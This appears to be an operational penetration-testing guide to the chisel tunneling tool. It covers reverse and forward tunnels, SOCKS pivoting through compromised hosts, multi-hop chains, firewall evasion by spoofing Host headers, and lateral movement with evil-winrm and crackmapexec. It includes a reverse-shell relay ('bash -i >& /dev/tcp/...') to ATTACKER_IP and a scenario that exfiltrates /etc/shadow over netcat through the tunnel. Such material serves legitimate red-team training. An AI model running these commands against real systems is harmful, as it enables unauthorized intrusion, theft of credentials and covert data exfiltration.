# Chisel Tunneling Guide

Comprehensive guide for establishing tunnels, pivoting, and network traversal using chisel.

## Table of Contents

- [Understanding Chisel Architecture](#understanding-chisel-architecture)
- [Tunnel Types](#tunnel-types)
- [Reverse Tunnel Setup](#reverse-tunnel-setup)
- [Forward Tunnel Setup](#forward-tunnel-setup)
- [SOCKS Proxy Through Chisel](#socks-proxy-through-chisel)
- [Multiple Port Forwards](#multiple-port-forwards)
- [Chaining Multiple Chisel Instances](#chaining-multiple-chisel-instances)
- [Practical Scenarios](#practical-scenarios)
- [Performance Tuning](#performance-tuning)
- [Troubleshooting](#troubleshooting)

---

## Understanding Chisel Architecture

Chisel operates as a client-server model over HTTP/HTTPS with SSH encryption:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          CHISEL ARCHITECTURE                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│    ┌──────────────┐         HTTP/WebSocket          ┌──────────────┐       │
│    │              │     (SSH-encrypted payload)     │              │       │
│    │    CLIENT    │◄───────────────────────────────►│    SERVER    │       │
│    │              │                                 │              │       │
│    └──────────────┘                                 └──────────────┘       │
│           │                                                │                │
│           │ Local tunnels                                  │ Remote tunnels│
│           ▼                                                ▼                │
│    ┌──────────────┐                                 ┌──────────────┐       │
│    │   Internal   │                                 │   Internal   │       │
│    │   Services   │                                 │   Services   │       │
│    └──────────────┘                                 └──────────────┘       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Key Concepts

| Term | Description |
|------|-------------|
| **Server** | Listens for client connections, can host or accept tunnels |
| **Client** | Initiates connection to server, defines tunnel specifications |
| **Forward Tunnel** | Traffic flows: Client → Server → Destination |
| **Reverse Tunnel** | Traffic flows: Server → Client → Destination |
| **Remote Spec** | Tunnel definition: `[R:]<local>:<remote>` |

---

## Tunnel Types

### Remote Specification Syntax

```
[R:][[local-host:]local-port:][remote-host:]remote-port[/protocol]

Components:
  R:           - Prefix for reverse tunnel (server → client)
  local-host   - Bind address (default: 0.0.0.0 for server, 127.0.0.1 for client)
  local-port   - Port to listen on
  remote-host  - Destination host (default: 127.0.0.1)
  remote-port  - Destination port
  /protocol    - tcp (default) or udp
```

### Examples

| Spec | Description |
|------|-------------|
| `8080:80` | Forward local 8080 to remote 80 |
| `8080:192.168.1.5:80` | Forward local 8080 to remote host's 192.168.1.5:80 |
| `R:8080:80` | Reverse: Server's 8080 to client's 80 |
| `R:0.0.0.0:8080:80` | Reverse: Server's 8080 (all interfaces) to client's 80 |
| `socks` | SOCKS5 proxy on client's 1080 |
| `R:socks` | SOCKS5 proxy on server's 1080, routing through client |
| `53:8.8.8.8:53/udp` | UDP tunnel for DNS |

---

## Reverse Tunnel Setup

Reverse tunnels are essential for pentesting - they allow the target (client) to expose services back to your attack box (server).

### Basic Reverse Tunnel

```
┌────────────────────────────────────────────────────────────────────────────┐
│                         REVERSE TUNNEL TOPOLOGY                            │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│   ATTACKER (Server)                         TARGET (Client)                │
│   ┌────────────────┐                        ┌────────────────┐            │
│   │                │                        │                │            │
│   │  0.0.0.0:8080  │◄──── Chisel Tunnel ────│   chisel       │            │
│   │  (chisel srv)  │        (HTTP/WS)       │   client       │            │
│   │                │                        │                │            │
│   │  127.0.0.1:    │                        │                │            │
│   │    9001 ◄──────┼────────────────────────┼─► localhost:80 │            │
│   │  (exposed)     │      R:9001:80         │   (web server) │            │
│   │                │                        │                │            │
│   └────────────────┘                        └────────────────┘            │
│                                                                            │
│   Access target's web server: curl http://127.0.0.1:9001                  │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**Attacker (Server):**
```bash
# Start server with reverse tunnel support
chisel server -p 8080 --reverse

# With authentication (recommended)
chisel server -p 8080 --reverse --auth user:S3cr3tP@ss

# Bind to specific interface
chisel server --host 10.10.14.5 -p 8080 --reverse
```

**Target (Client):**
```bash
# Expose target's localhost:80 on attacker's 9001
chisel client 10.10.14.5:8080 R:9001:127.0.0.1:80

# With authentication
chisel client --auth user:S3cr3tP@ss 10.10.14.5:8080 R:9001:127.0.0.1:80

# Expose on all server interfaces (dangerous - use with caution)
chisel client 10.10.14.5:8080 R:0.0.0.0:9001:127.0.0.1:80
```

### Reverse Tunnel for Shell Access

```
┌────────────────────────────────────────────────────────────────────────────┐
│                      REVERSE SHELL RELAY                                   │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│   ATTACKER                                              TARGET             │
│   ┌───────────────┐       Chisel Tunnel       ┌───────────────────┐       │
│   │               │                           │                   │       │
│   │ nc -lvnp 4444 │◄──────────────────────────│  bash -i >& ...   │       │
│   │  (listener)   │      R:4444:4444          │  (reverse shell)  │       │
│   │               │                           │                   │       │
│   │ chisel server │◄──────────────────────────│  chisel client    │       │
│   │    :8080      │        (HTTP/WS)          │                   │       │
│   └───────────────┘                           └───────────────────┘       │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**Setup:**
```bash
# Attacker: Start chisel server and listener
chisel server -p 8080 --reverse &
nc -lvnp 4444

# Target: Connect chisel and trigger shell
chisel client ATTACKER_IP:8080 R:4444:127.0.0.1:4444 &
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

---

## Forward Tunnel Setup

Forward tunnels allow you (client) to access services through the server's network.

### Basic Forward Tunnel

```
┌────────────────────────────────────────────────────────────────────────────┐
│                         FORWARD TUNNEL TOPOLOGY                            │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│   ATTACKER (Client)           PIVOT (Server)           INTERNAL HOST       │
│   ┌──────────────┐           ┌──────────────┐         ┌──────────────┐    │
│   │              │           │              │         │              │    │
│   │ chisel       │──────────►│ chisel       │────────►│  10.10.10.5  │    │
│   │ client       │  HTTP/WS  │ server       │   TCP   │    :3306     │    │
│   │              │           │              │         │   (MySQL)    │    │
│   │ localhost:   │           │              │         │              │    │
│   │   3306 ◄─────┼───────────┼──────────────┼─────────┼──────────────┘    │
│   │              │           │              │                              │
│   └──────────────┘           └──────────────┘                              │
│                                                                            │
│   Access: mysql -h 127.0.0.1 -P 3306 -u root -p                           │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**Pivot Host (Server):**
```bash
chisel server -p 8080
```

**Attacker (Client):**
```bash
# Access internal MySQL through pivot
chisel client PIVOT_IP:8080 3306:10.10.10.5:3306

# Multiple internal services
chisel client PIVOT_IP:8080 3306:10.10.10.5:3306 5432:10.10.10.6:5432 8080:10.10.10.7:80
```

---

## SOCKS Proxy Through Chisel

SOCKS proxies provide dynamic port forwarding - route any traffic through the tunnel.

### Forward SOCKS (Client Side Proxy)

```
┌────────────────────────────────────────────────────────────────────────────┐
│                         FORWARD SOCKS PROXY                                │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│   ATTACKER (Client)              PIVOT (Server)        INTERNAL NETWORK    │
│   ┌──────────────┐              ┌──────────────┐      ┌───────────────┐   │
│   │              │              │              │      │ 10.10.10.0/24 │   │
│   │ proxychains  │              │              │      │               │   │
│   │     ↓        │              │              │      │  .5 (web)     │   │
│   │ SOCKS5 Proxy │              │ chisel       │      │  .6 (db)      │   │
│   │ 127.0.0.1:   │──────────────│ server       │─────►│  .7 (ssh)     │   │
│   │   1080       │   HTTP/WS    │ --socks5     │      │  .8 (smb)     │   │
│   │     ↓        │              │              │      │               │   │
│   │ chisel client│              │              │      └───────────────┘   │
│   │              │              │              │                          │
│   └──────────────┘              └──────────────┘                          │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**Pivot Host (Server):**
```bash
# Enable SOCKS on server side
chisel server -p 8080 --socks5
```

**Attacker (Client):**
```bash
# Request SOCKS proxy (binds to local 1080)
chisel client PIVOT_IP:8080 socks

# Custom port
chisel client PIVOT_IP:8080 1337:socks
```

**Using the proxy:**
```bash
# With proxychains
proxychains nmap -sT -Pn 10.10.10.5

# With curl
curl --socks5 127.0.0.1:1080 http://10.10.10.5/

# With Firefox (set SOCKS5 proxy to 127.0.0.1:1080)
```

### Reverse SOCKS (Server Routes Through Client)

```
┌────────────────────────────────────────────────────────────────────────────┐
│                         REVERSE SOCKS PROXY                                │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│   ATTACKER (Server)              TARGET (Client)       INTERNAL NETWORK    │
│   ┌──────────────┐              ┌──────────────┐      ┌───────────────┐   │
│   │              │              │              │      │ 192.168.1.0/24│   │
│   │ proxychains  │              │              │      │               │   │
│   │     ↓        │              │              │      │  .10 (dc)     │   │
│   │ SOCKS5 Proxy │              │ chisel       │      │  .20 (web)    │   │
│   │ 127.0.0.1:   │◄─────────────│ client       │◄────►│  .30 (db)     │   │
│   │   1080       │    R:socks   │              │      │  .40 (files)  │   │
│   │     ↓        │              │              │      │               │   │
│   │ chisel server│              │              │      └───────────────┘   │
│   │   --reverse  │              │              │                          │
│   └──────────────┘              └──────────────┘                          │
│                                                                            │
│   Attacker can now reach 192.168.1.0/24 via SOCKS on localhost:1080       │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**Attacker (Server):**
```bash
chisel server -p 8080 --reverse
```

**Target (Client):**
```bash
# Expose SOCKS proxy on server
chisel client ATTACKER_IP:8080 R:socks

# Custom port on server
chisel client ATTACKER_IP:8080 R:1337:socks
```

---

## Multiple Port Forwards

Chisel supports multiple simultaneous tunnels in a single connection.

### Multiple Forwards in One Command

```bash
# Client connecting multiple tunnels
chisel client PIVOT_IP:8080 \
    3306:10.10.10.5:3306 \
    8080:10.10.10.6:80 \
    22:10.10.10.7:22 \
    5985:10.10.10.8:5985

# Multiple reverse tunnels
chisel client ATTACKER_IP:8080 \
    R:80:127.0.0.1:80 \
    R:443:127.0.0.1:443 \
    R:22:127.0.0.1:22 \
    R:socks
```

### Mixed Forward and Reverse

```bash
# Requires --reverse on server
chisel server -p 8080 --reverse

# Client with both forward and reverse tunnels
chisel client ATTACKER_IP:8080 \
    R:9001:127.0.0.1:80 \      # Reverse: expose my web
    R:9002:127.0.0.1:22 \      # Reverse: expose my SSH
    8080:10.10.10.5:8080 \     # Forward: access internal web
    R:socks                     # Reverse SOCKS
```

---

## Chaining Multiple Chisel Instances

For deep network pivoting through multiple compromised hosts.

### Double Pivot Scenario

```
┌────────────────────────────────────────────────────────────────────────────┐
│                         DOUBLE PIVOT CHAIN                                 │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│   ATTACKER          PIVOT 1             PIVOT 2            TARGET          │
│   10.10.14.5       10.10.10.5         172.16.1.10        192.168.1.100    │
│   ┌────────┐       ┌────────┐         ┌────────┐         ┌────────┐       │
│   │        │       │        │         │        │         │        │       │
│   │ chisel │◄──────│ chisel │         │ chisel │         │        │       │
│   │ server │  R:   │ client │         │ server │         │ Target │       │
│   │ :8080  │ socks │        │         │ :9090  │         │Service │       │
│   │        │       │ chisel │◄────────│        │◄────────│        │       │
│   │ SOCKS  │       │ server │  R:     │ chisel │  Local  │        │       │
│   │ :1080  │       │ :9090  │  socks  │ client │  Tunnel │        │       │
│   │        │       │        │         │        │         │        │       │
│   └────────┘       └────────┘         └────────┘         └────────┘       │
│                                                                            │
│   SOCKS Chain: Attacker → Pivot1 → Pivot2 → Target                        │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**Setup Commands:**

```bash
# Step 1: Attacker starts server
# On Attacker (10.10.14.5)
chisel server -p 8080 --reverse

# Step 2: Pivot1 connects back and starts its own server
# On Pivot1 (10.10.10.5)
chisel client 10.10.14.5:8080 R:socks &
chisel server -p 9090 --reverse

# Step 3: Pivot2 connects to Pivot1 and exposes SOCKS
# On Pivot2 (172.16.1.10)
chisel client 10.10.10.5:9090 R:socks
```

**Proxychains Configuration for Chained Proxies:**

```ini
# /etc/proxychains4.conf
[ProxyList]
# First hop: Through Pivot1
socks5 127.0.0.1 1080
# Note: For true chaining, configure proxy on Pivot1 or use multiple configs
```

### Alternative: Port Forward Chain

```bash
# Attacker: Start server
chisel server -p 8080 --reverse

# Pivot1: Reverse tunnel + forward to Pivot2
chisel client ATTACKER_IP:8080 R:9090:172.16.1.10:9090

# Now attacker can reach Pivot2's chisel on localhost:9090
# Pivot2 runs server, Attacker connects as client through the tunnel
chisel client 127.0.0.1:9090 socks

# Or Pivot2 connects to Pivot1's forwarded port
# Pivot2:
chisel client 10.10.10.5:9090 R:socks
```

---

## Practical Scenarios

### Scenario 1: Pivoting Through Compromised Host

**Situation:** You have RCE on a web server (10.10.10.5) and need to access internal network (192.168.1.0/24).

```
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                            │
│   INTERNET                │ FIREWALL │            INTERNAL NETWORK         │
│                           │          │                                     │
│   ┌──────────┐           │          │   ┌─────────┐    ┌─────────────┐   │
│   │ Attacker │           │  :80 ────┼───│ Web Srv │    │ 192.168.1.5 │   │
│   │10.10.14.5│           │  only    │   │10.10.10.5    │   (DC)      │   │
│   │          │◄──────────┼──────────┼───│         │───►│             │   │
│   │          │   HTTP    │          │   │         │    └─────────────┘   │
│   │          │  Tunnel   │          │   │         │    ┌─────────────┐   │
│   │          │           │          │   │         │───►│ 192.168.1.10│   │
│   └──────────┘           │          │   └─────────┘    │   (DB)      │   │
│                           │          │                  └─────────────┘   │
│                           │          │                                     │
└────────────────────────────────────────────────────────────────────────────┘
```

**Attack Steps:**

```bash
# 1. Attacker: Start chisel server
chisel server -p 443 --reverse

# 2. Upload chisel to web server, execute:
./chisel client 10.10.14.5:443 R:socks

# 3. Configure proxychains on attacker
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# 4. Scan internal network
proxychains nmap -sT -Pn -p 445,3389,5985 192.168.1.0/24

# 5. Access internal services
proxychains evil-winrm -i 192.168.1.5 -u admin -p 'password'
proxychains psql -h 192.168.1.10 -U postgres
```

### Scenario 2: Accessing Internal Web Applications

**Situation:** Internal webapp at 172.16.50.10:8080, only accessible from DMZ server.

```bash
# DMZ Server (pivot)
chisel server -p 8888

# Attacker
chisel client DMZ_IP:8888 8080:172.16.50.10:8080

# Now browse to http://127.0.0.1:8080
```

### Scenario 3: Using with Proxychains

**Proxychains configuration (`/etc/proxychains4.conf`):**

```ini
# Quiet mode - no output
quiet_mode

# Proxy DNS through tunnel
proxy_dns

# Timeout
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

**Common proxychains usage:**

```bash
# Service enumeration
proxychains nmap -sT -Pn -p- --min-rate 1000 TARGET_IP

# SMB operations
proxychains smbclient -L //192.168.1.5/ -U 'domain/user%password'
proxychains crackmapexec smb 192.168.1.0/24 -u user -p pass

# Windows Remote Management
proxychains evil-winrm -i 192.168.1.5 -u admin -p password

# SSH
proxychains ssh user@192.168.1.10

# HTTP tools
proxychains curl http://192.168.1.20/
proxychains gobuster dir -u http://192.168.1.20/ -w /usr/share/wordlists/common.txt
```

### Scenario 4: Evading Firewalls

**Problem:** Outbound connections blocked except HTTP/HTTPS.

```bash
# Use standard web ports
chisel server -p 80 --reverse
chisel server -p 443 --reverse

# Through HTTP proxy (if required)
chisel client --proxy http://PROXY:3128 ATTACKER:443 R:socks

# Through SOCKS proxy
chisel client --proxy socks://PROXY:1080 ATTACKER:443 R:socks
```

**Hostname-based evasion:**

```bash
# Server with custom hostname header checking
chisel server -p 443 --host 0.0.0.0

# Client with specific headers
chisel client --header "Host: legitimate-site.com" ATTACKER:443 R:socks
```

**TLS/SSL:**

```bash
# Generate self-signed cert
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Server with TLS
chisel server -p 443 --tls-key key.pem --tls-cert cert.pem --reverse

# Client connecting with TLS
chisel client --fingerprint FINGERPRINT https://ATTACKER:443 R:socks
```

### Scenario 5: Exfiltrating Data Through Chisel

```bash
# Create reverse tunnel for file transfer
# Attacker
chisel server -p 8080 --reverse
nc -lvnp 9999 > received_file

# Target
chisel client ATTACKER:8080 R:9999:127.0.0.1:9999
cat /etc/shadow | nc 127.0.0.1 9999
```

---

## Performance Tuning

### Connection Optimization

```bash
# Increase keepalive frequency (default: 25s)
chisel client --keepalive 10s ATTACKER:8080 R:socks

# Adjust max retry interval (default: 5m)
chisel client --max-retry-interval 30s ATTACKER:8080 R:socks

# Adjust max retry count (default: unlimited)
chisel client --max-retry-count 10 ATTACKER:8080 R:socks
```

### Resource Management

```bash
# Server: Limit maximum connections
# (not built-in, use reverse proxy or iptables)

# Background the client with reconnection
chisel client --keepalive 10s --max-retry-interval 1m ATTACKER:8080 R:socks &
```

### Bandwidth Considerations

For slow connections:

```bash
# Use compression (if available in your version)
# Note: Chisel uses SSH which has some compression by default

# Prefer targeted port forwards over SOCKS for critical services
chisel client ATTACKER:8080 \
    R:445:127.0.0.1:445 \
    R:5985:127.0.0.1:5985
```

### Stability Tips

1. **Use authentication** - Prevents unauthorized tunnel hijacking
2. **Enable keepalives** - Detect dead connections faster
3. **Set reasonable retry limits** - Avoid infinite reconnection loops
4. **Monitor connections** - Watch for dropped tunnels

```bash
# Robust production setup
chisel server -p 8080 --reverse --auth user:$(openssl rand -hex 16)

chisel client \
    --auth user:RANDOM_HEX \
    --keepalive 15s \
    --max-retry-interval 2m \
    ATTACKER:8080 R:socks
```

---

## Troubleshooting

### Common Issues

| Issue | Cause | Solution |
|-------|-------|----------|
| Connection refused | Server not running/wrong port | Verify server is listening: `ss -tlnp` |
| Tunnel not working | Wrong remote spec syntax | Check syntax: `R:local:remote` for reverse |
| SOCKS timeout | Proxy misconfigured | Verify SOCKS port (default 1080) |
| Authentication failed | Wrong credentials | Match --auth on both server and client |
| Connection drops | Firewall/timeout | Reduce keepalive interval |

### Debug Mode

```bash
# Verbose output for troubleshooting
chisel server -p 8080 --reverse -v
chisel client -v ATTACKER:8080 R:socks

# Very verbose (debug level)
chisel client -v -v ATTACKER:8080 R:socks
```

### Verify Tunnels

```bash
# Check listening ports
ss -tlnp | grep chisel
netstat -tlnp | grep chisel

# Test SOCKS proxy
curl --socks5 127.0.0.1:1080 http://internal-host/

# Test specific tunnel
nc -zv 127.0.0.1 9001
```

---

## Quick Reference

### Attacker-Initiated Access (Forward Tunnel)

```bash
# Pivot runs server
chisel server -p 8080

# Attacker connects and creates tunnels
chisel client PIVOT:8080 LOCAL:REMOTE_HOST:REMOTE_PORT
```

### Target-Initiated Access (Reverse Tunnel)

```bash
# Attacker runs server
chisel server -p 8080 --reverse

# Target connects and exposes services
chisel client ATTACKER:8080 R:LOCAL:127.0.0.1:PORT
```

### SOCKS Quick Setup

```bash
# Forward SOCKS (through server)
chisel server -p 8080 --socks5
chisel client SERVER:8080 socks

# Reverse SOCKS (through client/target)
chisel server -p 8080 --reverse
chisel client SERVER:8080 R:socks
```

---

## References

- [Chisel GitHub Repository](https://github.com/jpillora/chisel)
- [Chisel Releases](https://github.com/jpillora/chisel/releases)
- [Proxychains-ng](https://github.com/rofl0r/proxychains-ng)
